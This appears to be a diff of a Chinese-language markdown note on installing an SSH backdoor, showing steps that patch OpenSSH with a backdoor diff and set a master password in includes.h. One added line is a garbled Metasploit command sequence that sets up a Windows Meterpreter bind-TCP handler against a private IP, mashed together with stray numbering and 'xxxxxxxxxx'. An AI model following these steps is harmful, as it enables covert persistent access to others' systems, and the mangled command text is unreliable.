@@ -75,7 +75,7 @@ patch < sshbd5.9p1.diff # 打补丁就是修改替换原文件
 yum install patch
 ```
 
-*添加后门万能密码*
+xxxxxxxxxx5 1use exploit/multi/handler2set payload windows/meterpreter/bind_tcp3set rhost 192.168.11.1294set lport 33335runbash
 
 修改`includes.h`文件中记录用户名和密码的文件位置及其密码，命令如下
 
@@ -440,7 +440,7 @@ sudo chown -R www-data /var/www/html
 
 ==该部分内容参考自：https://blog.csdn.net/zhanghaiyang9999/article/details/106114073==
 
-！
+
 
 ------
 
